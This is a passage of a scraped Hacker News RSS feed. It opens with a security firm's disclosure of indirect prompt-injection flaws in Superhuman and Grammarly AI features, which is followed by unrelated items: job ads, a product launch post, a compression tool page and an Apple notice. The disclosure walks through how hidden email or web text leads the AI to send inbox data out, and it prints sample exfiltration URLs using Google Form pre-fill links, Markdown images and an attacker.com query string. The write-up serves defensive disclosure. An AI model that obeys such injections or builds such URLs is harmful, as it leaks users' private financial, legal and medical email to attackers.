    &lt;p&gt;Grammarly recently acquired Superhuman and Coda. The PromptArmor Threat Intelligence Team examined the new risk profile and identified indirect prompt injection vulnerabilities allowing for the exfiltration of emails and data from integrated services, as well as phishing risks, with vulnerabilities affecting products across the suite.&lt;lb/&gt;In this article, we walk through the following vulnerability (before discussing additional findings across the Superhuman product suite): &lt;lb/&gt;When asked to summarize the userâs recent mail, a prompt injection in an untrusted email manipulated Superhuman AI to submit content from dozens of other sensitive emails (including financial, legal, and medical information) in the userâs inbox to an attackerâs Google Form.&lt;/p&gt;
    &lt;p&gt;We reported these vulnerabilities to Superhuman, who quickly escalated the report and promptly remediated risks, addressing the threat at âincident paceâ. We greatly appreciate Superhumanâs professional handling of this disclosure, showing dedication to their usersâ security and privacy, and commitment to collaboration with the security research community. Their responsiveness and proactiveness in disabling vulnerable features and communicating fix timelines exhibited a security response in the top percentile of what we have seen for AI vulnerabilities (which are not yet well understood with existing remediation protocols).&lt;/p&gt;
    &lt;p&gt;Superhuman whitelisted Google Docs in its Content Security Policy. We used it as a bypass. By manipulating the AI to generate a pre-filled Google form submission link and output it using Markdown image syntax, the AI made automatic submissions to an attacker-controlled Google form.&lt;lb/&gt;We validated that an attacker can exfiltrate the full contents of multiple sensitive emails in one response, containing financials, privileged legal info, and sensitive medical data. We additionally exfiltrated partial contents from over 40 emails with a single AI response.&lt;/p&gt;
    &lt;head rend="h3"&gt;The Email Exfiltration Attack Chain&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;p&gt;One of the emails the user has received in their inbox contains a prompt injection.&lt;/p&gt;&lt;p&gt;Note: In our attack chain, the injection in the email is hidden using white-on-white text, but the attack does not depend on the concealment! The malicious email could simply exist in the victimâs inbox unopened, with a plain-text injection.&lt;/p&gt;&lt;lb/&gt;This prompt injection will manipulate Superhuman AI into exfiltrating sensitive data from other emails â and the user does not even need to open this email to make that happen.&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The user asks Superhuman to summarize their recent emails, and the AI searches and finds the emails from the last hour&lt;/p&gt;
        &lt;p&gt;This is a quite common use case for email AI companions. The user has asked about emails from the last hour, so the AI retrieves those emails. One of those emails contains the malicious prompt injection, and others contain sensitive private information.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Superhuman AI is manipulated to exfiltrate the sensitive emails to an attacker&lt;/p&gt;&lt;lb/&gt;The hidden prompt injection manipulates the AI to do the following:&lt;list rend="ol"&gt;&lt;item&gt;&lt;p&gt;Take the data from the email search results&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Populate the attackerâs Google Form URL with the data from the email search results in the âentryâ parameter&lt;/p&gt;&lt;/item&gt;&lt;item&gt;&lt;p&gt;Output a Markdown image that contains this Google Form URL&lt;/p&gt;&lt;/item&gt;&lt;/list&gt;&lt;p&gt;By doing so, the AI acts on behalf of the attacker to exfiltrate sensitive user emails despite the Content Security Policy!&lt;/p&gt;&lt;p&gt;How does this happen?&lt;/p&gt;&lt;p&gt;The prompt injection tells Superhuman AI that the user must be given the option to submit a report giving feedback on the quality of the email search results - and as such will need to fill out a form - and provides the attackerâs Google Form link.&lt;/p&gt;&lt;p&gt;Superhuman has a CSP in place - which prevents outbound requests to malicious domains; however, they have allowed requests to docs.google.com.&lt;/p&gt;&lt;p&gt;This is where the Google Form comes into play. Google Forms are hosted on a docs.google.com link, like so:&lt;/p&gt;&lt;p&gt;https://docsÛgoogleÛcom/forms/d/e/1FBIpQSSctTB2ClRI0c05fz2LqECK1aWPNEf7T39Y4hgwveOQYBL7tsV&lt;/p&gt;&lt;p&gt;However, Google Forms supports pre-filled response links. This lets form creators pre-populate form responses in a URL, so respondents only need to click a link to make a submission with the pre-filled data. As an example, clicking the link below would submit the message âhelloâ as a form response.&lt;/p&gt;&lt;p&gt;https://docs.google.com/forms/d/e/1FBIpQSSctTB2ClRI0c05fz2LqECK1aWPNEf7T39Y4hgwveOQYBL7tsV/formResponse?entry.953568459=&lt;/p&gt;&lt;code&gt;hello&lt;/code&gt;&lt;p&gt;Now the attacker has a mechanism for exfiltrating data. The prompt injection instructs the model to generate a pre-filled Google Form submission link, with the contents of the emails being analyzed as the pre-filled data.&lt;/p&gt;&lt;p&gt;https://docsÛgoogleÛcom/forms/d/e/1FBIpQSSctTB2ClRI0c05fz2LqECK1aWPNEf7T39Y4hgwveOQYBL7tsV/formResponse?entry.953568459=&lt;/p&gt;&lt;code&gt;{AI ADDS CONFIDENTIAL EMAIL DATA HERE}&lt;/code&gt;&lt;p&gt;Then, the model is instructed to use that URL as an âimage sourceâ and output an image using Markdown syntax. The reason to output a Markdown image is because when the userâs browser tries to render the Markdown image, a network request is made to the imageâs source URL in an attempt to retrieve the image, without requiring any user interaction or approval.&lt;/p&gt;&lt;p&gt;Note: in the Exploiting Superhuman Mailâs Web Search section, we demonstrate an attack that does not rely on the docs.google.com Google Forms CSP bypass â where the data could have been exfiltrated via any URL!&lt;/p&gt;&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The sensitive emails are exfiltrated&lt;/p&gt;
        &lt;p&gt;When the userâs browser tries to render the Markdown image, a network request is made to the imageâs source URL in an attempt to retrieve the image. The network request made in an attempt to retrieve the image is exactly the same type of request that is made when the link is clicked. And, as the URL has been constructed with the sensitive emails in the pre-filled entry parameter, the request automatically submits that data to the attackerâs Google Form.&lt;/p&gt;
        &lt;p&gt;The user does not even have to move a muscle. The user just needed to submit their query, and the AI executes the exfiltration attack without any further interaction: finding the sensitive emails, populating that data into the attackerâs Google Form link, and rendering the link as an image so it is automatically submitted:&lt;/p&gt;
        &lt;p&gt;If we view the network logs, we can see that the URL for the image request contains all of the details from the emails the AI was analyzing (we redacted names and email addresses):&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The attacker reads the email data submitted to their Google Form&lt;/p&gt;
        &lt;p&gt;Here we can see that the attackerâs malicious form received a submission containing all the emails from the last hour that were in the userâs inbox. Now, the attacker can read the emails since they own the form.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Zero-click Data Exfiltration in Superhuman Go and Grammarly&lt;/head&gt;
    &lt;p&gt;A similar vulnerability - with insecure Markdown images - was present in Superhuman Go (their new agentic product) and Grammarlyâs new agent-powered docs. For Grammarly, the scope was reduced as the AI only appeared to process the userâs active document and their queries, yielding a low chance of sensitive and untrustworthy data being processed simultaneously. However, for Superhuman Go, the attack surface was much larger. &lt;lb/&gt;Superhuman Go (1) reads data from web pages, and (2) connects to external services such as GSuite, Outlook, Stripe, Jira, Google Contacts, etc. This created a serious danger of sensitive data being processed at the same time as untrusted data - making zero-click data exfiltration a dangerous threat. Below, a user asks Superhuman Go about their active tab, an online reviews site, trying to see if they have any context in their email to help address the negative reviews. Unbeknownst to them, the review site contained a prompt injection, and Superhuman AI was manipulated to output a malicious 1 pixel image - leaking the financial data in the surfaced email.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;The user asks Superhuman Go about their active tab, an online reviews site (e.g., G2, etc):&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;The user has the Gmail connection selected, allowing Superhuman Go AI to search the inbox for emails like this one:&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;The AI is manipulated to construct a malicious Markdown image built with an attackerâs domain, with the userâs sensitive data appended to the end of the URL. The userâs browser makes a request and retrieves a 1 pixel grey image from the attackerâs site:&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;When the request for the image is made, the sensitive revenue and costs data appended to the image URL is logged to the attackerâs server, which they can then read:&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Exploiting Superhuman Mailâs Web Search&lt;/head&gt;
    &lt;p&gt;Superhuman Mail, in addition to the vulnerability described earlier with Google Form submissions, was vulnerable to data exfiltration through the AI web search feature.&lt;lb/&gt;Superhuman Mailâs AI agent had the capability to fetch external sites and use that data to answer questions for users (for example, accessing live news). However, because the agent could browse to any URL, an attacker could manipulate the agent to exfiltrate data. Hereâs what happened:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;A prompt injection in an email or web search result manipulates Superhuman AI to construct a malicious URL that is built with the attackerâs domain, and sensitive data (financial, legal, medical, etc.) from the userâs inbox is appended as a query parameter.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Ex: attacker.com/?data=&lt;code&gt;Bob%2C%20Im%20writing%20regarding%20sensitiveâ¦&lt;/code&gt;&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;The AI is manipulated to open the URL, and when it does, a request is made to the attackerâs server, leaking the email inbox data that was appended to the attackerâs URL.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Responsible Disclosure&lt;/head&gt;
    &lt;p&gt;Superhumanâs team approached our disclosure with professionalism and worked diligently to validate and remediate the vulnerabilities we reported. We appreciate their dedication and commitment to ensuring secure AI use.&lt;/p&gt;
    &lt;p&gt;We additionally reported phishing risks and single-click data exfiltration threats in Coda, not covered in this write-up, that were actioned on by the Superhuman team.&lt;/p&gt;
    &lt;p&gt;Timeline&lt;lb/&gt;12/05/2025 Initial disclosure (Friday night)&lt;lb/&gt;12/05/2025 Superhuman acknowledges receipt of the report&lt;lb/&gt;12/08/2025 Superhuman team escalates report (Monday morning)&lt;lb/&gt;12/08/2025 Initial patch disables vulnerable features&lt;lb/&gt;12/09/2025 First remediation patch is deployed&lt;lb/&gt;12/18/2025 Remediation patches deployed across additional surfaces&lt;lb/&gt;01/05/2026 Further findings reported&lt;lb/&gt;01/11/2026 Further remediation patches deployed&lt;lb/&gt;01/12/2026 Coordinated Disclosure&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46592424</guid><pubDate>Mon, 12 Jan 2026 18:38:39 +0000</pubDate></item><item><title>Clearspace (YC W23) Is Hiring an Applied Researcher (ML)</title><link>https://www.ycombinator.com/companies/clearspace/jobs/GOWiDwp-research-engineer-at-clearspace</link><description>&lt;doc fingerprint="14939967bc01edd1"&gt;
  &lt;main&gt;
    &lt;p&gt;Eliminate compulsive phone usage&lt;/p&gt;
    &lt;p&gt;About Clearspace&lt;/p&gt;
    &lt;p&gt;Clearspace is building the intentionality layer of the internet. Our mission is to build technology as effective at protecting human attention as social media is at exploiting it (infinite scrolling, short-form feeds, manipulative notifications, etc). Our category defining mobile app has been featured on Huberman Lab, New York Times Wirecutter, NPR Marketplace, Forbes, TBPN.&lt;/p&gt;
    &lt;p&gt;People that want a better relationship with their devices have nowhere to turn except for willpower. We are building an agent that achieves this on all devices by processing and filtering network traffic based on natural language rules.&lt;/p&gt;
    &lt;p&gt;About The Role&lt;/p&gt;
    &lt;p&gt;We are looking for an ML-focused engineer that will be responsible for training and improving a model for classifying network traffic. You are great for this role if you are not only excited about the latest in AI and ML but are also a problem-solver in the data domain. You don’t just think about the model but “how can we get more data volume”; “how can we featurize the data intelligently”; “what are our data needs based on our task and desired model size”, and like building backwards from inference requirements.&lt;/p&gt;
    &lt;p&gt;Responsibilities&lt;/p&gt;
    &lt;p&gt;Qualifications&lt;/p&gt;
    &lt;p&gt;Nice to Have&lt;/p&gt;
    &lt;p&gt;At Clearspace we help people reduce compulsive phone usage.&lt;/p&gt;
    &lt;p&gt;We exist to protect people's attention from the exploits of modern technology platforms and make space for the things that matter to them most.&lt;/p&gt;
    &lt;p&gt;We believe the technology to protect someones attention should be just as sophisticated and effective as the tech that is exploiting it and are building a world-class engineering team to arm the world with a comprehensive attention protection stack.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46592461</guid><pubDate>Mon, 12 Jan 2026 18:41:47 +0000</pubDate></item><item><title>Cowork: Claude Code for the rest of your work</title><link>https://claude.com/blog/cowork-research-preview</link><description>&lt;doc fingerprint="772d8cfe3f1786ef"&gt;
  &lt;main&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;January 12, 2026&lt;/item&gt;
      &lt;item&gt;5min&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When we released Claude Code, we expected developers to use it for coding. They didâand then quickly began using it for almost everything else. This prompted us to build Cowork: a simpler way for anyoneânot just developersâto work with Claude in the very same way. Cowork is available today as a research preview for Claude Max subscribers on our macOS app, and we will improve it rapidly from here.&lt;/p&gt;
    &lt;p&gt;How is using Cowork different from a regular conversation? In Cowork, you give Claude access to a folder of your choosing on your computer. Claude can then read, edit, or create files in that folder. It can, for example, re-organize your downloads by sorting and renaming each file, create a new spreadsheet with a list of expenses from a pile of screenshots, or produce a first draft of a report from your scattered notes.Â&lt;/p&gt;
    &lt;p&gt;In Cowork, Claude completes work like this with much more agency than youâd see in a regular conversation. Once youâve set it a task, Claude will make a plan and steadily complete it, while looping you in on what itâs up to. If youâve used Claude Code, this will feel familiarâCowork is built on the very same foundations. This means Cowork can take on many of the same tasks that Claude Code can handle, but in a more approachable form for non-coding tasks.Â Â&lt;/p&gt;
    &lt;p&gt;When youâve mastered the basics, you can make Cowork more powerful still. Claude can use your existing connectors, which link Claude to external information, and in Cowork weâve added an initial set of skills that improve Claudeâs ability to create documents, presentations, and other files. If you pair Cowork with Claude in Chrome, Claude can complete tasks that require browser access, too.&lt;/p&gt;
    &lt;p&gt;Cowork is designed to make using Claude for new work as simple as possible. You donât need to keep manually providing context or converting Claudeâs outputs into the right format. Nor do you have to wait for Claude to finish before offering further ideas or feedback: you can queue up tasks and let Claude work through them in parallel. It feels much less like a back-and-forth and much more like leaving messages for a coworker.Â&lt;/p&gt;
    &lt;head rend="h2"&gt;Stay in control&lt;/head&gt;
    &lt;p&gt;In Cowork, you can choose which folders and connectors Claude can see: Claude canât read or edit anything you donât give it explicit access to. Claude will also ask before taking any significant actions, so you can steer or course-correct it as you need.Â&lt;/p&gt;
    &lt;p&gt;That said, there are still things to be aware of before you give Claude control. By default, the main thing to know is that Claude can take potentially destructive actions (such as deleting local files) if itâs instructed to. Since thereâs always some chance that Claude might misinterpret your instructions, you should give Claude very clear guidance around things like this.Â&lt;/p&gt;
    &lt;p&gt;You should also be aware of the risk of âprompt injectionsâ: attempts by attackers to alter Claudeâs plans through content it might encounter on the internet. Weâve built sophisticated defenses against prompt injections, but agent safetyâthat is, the task of securing Claudeâs real-world actionsâis still an active area of development in the industry.Â&lt;/p&gt;
    &lt;p&gt;These risks arenât new with Cowork, but it might be the first time youâre using a more advanced tool that moves beyond a simple conversation. We recommend taking precautions, particularly while you learn how it works. We provide more detail in our Help Center.Â&lt;/p&gt;
    &lt;head rend="h2"&gt;Looking forward&lt;/head&gt;
    &lt;p&gt;This is a research preview. Weâre releasing Cowork early because we want to learn what people use it for, and how they think it could be better. We encourage you to experiment with what Cowork can do for you, and to try things you donât expect to work: you might be surprised! As we learn more from this preview, we plan to make lots of improvements (including by adding cross-device sync and bringing it to Windows), and weâll identify further ways to make it safer.Â&lt;/p&gt;
    &lt;p&gt;Claude Max subscribers can try Cowork now by downloading the macOS app, then clicking on âCoworkâ in the sidebar. If you're on another plan, you can join the waitlist for future access.&lt;/p&gt;
    &lt;head rend="h2"&gt;Transform how your organization operates with Claude&lt;/head&gt;
    &lt;p&gt;Get the developer newsletter&lt;/p&gt;
    &lt;p&gt;Product updates, how-tos, community spotlights, and more. Delivered monthly to your inbox.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46593022</guid><pubDate>Mon, 12 Jan 2026 19:27:19 +0000</pubDate></item><item><title>The chess bot on Delta Air Lines will destroy you (2024) [video]</title><link>https://www.youtube.com/watch?v=c0mLhHDcY3I</link><description>&lt;doc fingerprint="50559455455d1642"&gt;
  &lt;main&gt;
    &lt;p&gt;About Press Copyright Contact us Creators Advertise Developers Terms Privacy Policy &amp;amp; Safety How YouTube works Test new features NFL Sunday Ticket © 2026 Google LLC&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46593395</guid><pubDate>Mon, 12 Jan 2026 19:57:37 +0000</pubDate></item><item><title>Show HN: Sophomore at UMich, built an app with my dad</title><link>https://www.workjourney.ai/</link><description>&lt;doc fingerprint="b950007bbbf8fcbe"&gt;
  &lt;main&gt;
    &lt;p&gt;Build your work journey, validate your wins and skills, and share AI summaries with your manager. Turn your weekly updates into verified resume citations.&lt;/p&gt;
    &lt;p&gt;"You've shown consistent growth in project management. I've added this to your quarterly review draft."&lt;/p&gt;
    &lt;p&gt;Write your goals, track OKRs, add successes, create an online work journey. The fear of layoffs have left many employees hiding in their cubicles, eyes staring at their monitors. To survive future layoffs, be visible, document progress, learn high-demand skills and document everything.&lt;/p&gt;
    &lt;p&gt;The private journal is your personal progress repository and weekly AI summaries are concise progress updates to share with your manager. You can select a date range to generate a quarterly summary for performance reviews and make edits to any summary before sharing.&lt;/p&gt;
    &lt;p&gt;Employees&lt;/p&gt;
    &lt;p&gt;Log project updates, record successes for manager validation, generate AI summaries for one-on-ones.&lt;/p&gt;
    &lt;p&gt;Managers&lt;/p&gt;
    &lt;p&gt;Get regular AI summaries from team members, track alignment to OKRs and team progress. Get quarterly team snapshots before performance reviews.&lt;/p&gt;
    &lt;p&gt;College Students&lt;/p&gt;
    &lt;p&gt;Paste your resume, track daily work and skill growth, and get weekly AI summaries with project insights and personalized learning recommendations.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46593695</guid><pubDate>Mon, 12 Jan 2026 20:20:11 +0000</pubDate></item><item><title>Fabrice Bellard's TS Zip (2024)</title><link>https://www.bellard.org/ts_zip/</link><description>&lt;doc fingerprint="a5077a8aa4100a3b"&gt;
  &lt;main&gt;&lt;head rend="h1"&gt;ts_zip: Text Compression using Large Language Models&lt;/head&gt; The &lt;code&gt;ts_zip&lt;/code&gt; utility can
compress (and hopefully decompress) text files using a Large Language
Model. The compression ratio is much higher than with other
compression tools. There are some caveats of course:
&lt;list rend="ul"&gt;&lt;item&gt;A GPU is necessary to get a reasonable speed. 4 GB of RAM is required. &lt;/item&gt;&lt;item&gt;It is slower than conventional compressors (compression and decompression speed: up to 1 MB/s on a RTX 4090).&lt;/item&gt;&lt;item&gt;Only text files are supported. Binary files won't be compressed much. The currently used language model (RWKV 169M v4) was trained mostly on English texts. Other languages are supported including source code.&lt;/item&gt;&lt;item&gt;It is experimental so no backward compability should be expected between the various versions.&lt;/item&gt;&lt;item&gt;See also ts_sms which is optimized for the compression of small messages.&lt;/item&gt;&lt;/list&gt;&lt;head rend="h2"&gt;Compression Ratio&lt;/head&gt;&lt;p&gt; The compression ratio is given in bits per byte (bpb). &lt;/p&gt;&lt;table&gt;&lt;row&gt;&lt;cell aria-sort="ascending" style="width:15em;" role="head"&gt;File &lt;/cell&gt;&lt;cell class="num" style="width:8em;" role="head"&gt;Original size&lt;lb/&gt;(bytes) &lt;/cell&gt;&lt;cell class="num" style="width:12em;" colspan="2" role="head"&gt;xz&lt;lb/&gt;(bytes) (bpb) &lt;/cell&gt;&lt;cell class="num" style="width:12em;" colspan="2" role="head"&gt;ts_zip&lt;lb/&gt;(bytes) (bpb) &lt;/cell&gt;&lt;/row&gt;&lt;row&gt;&lt;cell&gt;alice29.txt &lt;/cell&gt;&lt;cell class="num"&gt;152089 &lt;/cell&gt;&lt;cell class="num"&gt;48492 &lt;/cell&gt;&lt;cell class="num"&gt;2.551 &lt;/cell&gt;&lt;cell class="num"&gt;21713 &lt;/cell&gt;&lt;cell class="num"&gt;1.142 &lt;/cell&gt;&lt;/row&gt;&lt;row&gt;&lt;cell&gt;book1 &lt;/cell&gt;&lt;cell class="num"&gt;768771 &lt;/cell&gt;&lt;cell class="num"&gt;261116 &lt;/cell&gt;&lt;cell class="num"&gt;2.717 &lt;/cell&gt;&lt;cell class="num"&gt;137477 &lt;/cell&gt;&lt;cell class="num"&gt;1.431 &lt;/cell&gt;&lt;/row&gt;&lt;row&gt;&lt;cell&gt;enwik8 &lt;/cell&gt;&lt;cell class="num"&gt;100000000 &lt;/cell&gt;&lt;cell class="num"&gt;24865244 &lt;/cell&gt;&lt;cell class="num"&gt;1.989 &lt;/cell&gt;&lt;cell class="num"&gt;13825741 &lt;/cell&gt;&lt;cell class="num"&gt;1.106 &lt;/cell&gt;&lt;/row&gt;&lt;row&gt;&lt;cell&gt;enwik9 &lt;/cell&gt;&lt;cell class="num"&gt;1000000000 &lt;/cell&gt;&lt;cell class="num"&gt;213370900 &lt;/cell&gt;&lt;cell class="num"&gt;1.707 &lt;/cell&gt;&lt;cell class="num"&gt;135443237 &lt;/cell&gt;&lt;cell class="num"&gt;1.084 &lt;/cell&gt;&lt;/row&gt;&lt;row&gt;&lt;cell&gt;linux-1.2.13.tar &lt;/cell&gt;&lt;cell class="num"&gt;9379840 &lt;/cell&gt;&lt;cell class="num"&gt;1689468 &lt;/cell&gt;&lt;cell class="num"&gt;1.441 &lt;/cell&gt;&lt;cell class="num"&gt;1196859 &lt;/cell&gt;&lt;cell class="num"&gt;1.021 &lt;/cell&gt;&lt;/row&gt;&lt;/table&gt;&lt;p&gt; Results and speed for other programs on enwik8 and enwik9 are available at the Large Text Compression Benchmark. &lt;/p&gt;&lt;head rend="h2"&gt;Download&lt;/head&gt;&lt;head rend="h2"&gt;Technical information&lt;/head&gt;&lt;list rend="ul"&gt;&lt;item&gt;&lt;code&gt;ts_zip&lt;/code&gt; uses
  the RWKV 169M v4
  language model which is a good compromise between speed and
  compression ratio. The model is quantized to 8 bits per parameter
    and evaluated using BF16 floating point numbers.&lt;/item&gt;&lt;item&gt;The language model predicts the probabilities of the next token. An arithmetic coder then encodes the next token according to the probabilities.&lt;/item&gt;&lt;item&gt;The model is evaluated in a deterministic and reproducible way. Hence the result does not depend on the exact GPU or CPU model nor on the number of configured threads. This key point ensures that a compressed file can be decompressed using a different hardware or software configuration.&lt;/item&gt;&lt;/list&gt;&lt;lb/&gt;Fabrice Bellard - https://bellard.org/&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46593802</guid><pubDate>Mon, 12 Jan 2026 20:26:47 +0000</pubDate></item><item><title>Update on age requirements for apps distributed in Texas</title><link>https://developer.apple.com/news/?id=8jzbigf4</link><description>&lt;doc fingerprint="ec84521338b01a14"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Update on age requirements for apps distributed in Texas&lt;/head&gt;
    &lt;p&gt;December 23, 2025&lt;/p&gt;
    &lt;p&gt;A recent injunction issued by a district court suspended enforcement of Texas state law SB2420, which introduced age assurance requirements for app marketplaces and developers. In light of this ruling, Apple will pause previously announced implementation plans and monitor the ongoing legal process.&lt;/p&gt;
    &lt;p&gt;The tools we previously announced to help developers meet their compliance obligations will remain available for sandbox testing, including:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Declared Age Range API&lt;/item&gt;
      &lt;item&gt;Significant Change API under PermissionKit&lt;/item&gt;
      &lt;item&gt;New age rating property type in StoreKit&lt;/item&gt;
      &lt;item&gt;App Store Server Notifications&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;These tools can also be used to help developers with their obligations under laws coming into effect in Utah and Louisiana in 2026. The Declared Age Range API remains available worldwide for users on iOS 26, iPadOS 26, and macOS 26, or later.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46593819</guid><pubDate>Mon, 12 Jan 2026 20:27:34 +0000</pubDate></item><item><title>F2 (YC S25) Is Hiring</title><link>https://www.ycombinator.com/companies/f2/jobs/cJsc7Fe-product-designer</link><description>&lt;doc fingerprint="777b7af98957236a"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;head rend="h3"&gt;Role Overview&lt;/head&gt;
        &lt;p&gt;We’re hiring a Product Designer to craft intuitive, elegant, and impactful user experiences across F2’s platform. You’ll partner with Product, Engineering, and Customer teams to define workflows, refine interaction patterns, and elevate the design language for a complex B2B AI product. As an early designer at F2, you’ll influence the product’s vision and have a direct impact on how investment professionals interact with cutting-edge AI capabilities.&lt;/p&gt;
        &lt;head rend="h3"&gt;What You’ll Do&lt;/head&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Lead end-to-end design across new and existing features — from user research and ideation through prototyping, interaction design, and final UI.&lt;/item&gt;
          &lt;item&gt;Collaborate closely with Product and Engineering to translate product strategy into intuitive experiences.&lt;/item&gt;
          &lt;item&gt;Define and maintain design systems and visual standards to ensure consistency and scalability.&lt;/item&gt;
          &lt;item&gt;Balance business goals with user needs, prioritizing work that drives adoption, engagement, and product delight.&lt;/item&gt;
        &lt;/list&gt;
        &lt;head rend="h3"&gt;You Might Be a Great Fit If&lt;/head&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;You have 2+ years of experience in product design, UX/UI, or related roles, ideally with SaaS products and/or AI-driven tools.&lt;/item&gt;
          &lt;item&gt;You have a strong portfolio that demonstrates design thinking, problem solving, and polished visual execution across complex workflows.&lt;/item&gt;
          &lt;item&gt;You’re comfortable leading design efforts in ambiguity, iterating quickly, and shipping with high quality.&lt;/item&gt;
          &lt;item&gt;You excel at cross-functional collaboration and communicate clearly with product, engineering, and business stakeholders.&lt;/item&gt;
          &lt;item&gt;You’re curious about how AI reshapes user interaction and excited to design experiences where human judgment and machine intelligence converge.&lt;/item&gt;
        &lt;/list&gt;
        &lt;head rend="h3"&gt;Preferred Qualifications&lt;/head&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Experience designing for data-intensive enterprise products or B2B platforms.&lt;/item&gt;
          &lt;item&gt;Background in UX research, usability testing, and incorporating user feedback into measurable product improvements.&lt;/item&gt;
        &lt;/list&gt;
        &lt;head rend="h3"&gt;Why F2?&lt;/head&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Join a fast-growing AI startup reshaping workflows in private markets and finance.&lt;/item&gt;
          &lt;item&gt;Be part of a small, high-impact team where your design decisions influence product strategy.&lt;/item&gt;
          &lt;item&gt;Competitive compensation with equity upside and benefits.&lt;/item&gt;
          &lt;item&gt;Collaborative, mission-driven culture that values craftsmanship, curiosity, and rapid iteration.&lt;/item&gt;
        &lt;/list&gt;
      &lt;/div&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;p&gt;F2 is the AI platform for private markets investors. Purpose-built for private credit, private equity, and commercial banks, F2 helps teams evaluate deals over 70% faster. Already trusted across thousands of deals, F2 makes collaboration easy and retains historical context, so past work compounds into future wins.&lt;/p&gt;
      &lt;p&gt;F2 accelerates private market investors’ workflows, streamlining the screening, underwriting and portfolio management processes. It connects data from financial models, data rooms, and 3rd party data to automate complex analysis, surface insights faster, and generate investor-grade, IC ready materials in minutes.&lt;/p&gt;
      &lt;p&gt;Headquartered in New York City, F2 is backed by leading investors including NFX, Left Lane Capital, and Y Combinator.&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46595130</guid><pubDate>Mon, 12 Jan 2026 22:30:33 +0000</pubDate></item></channel></rss>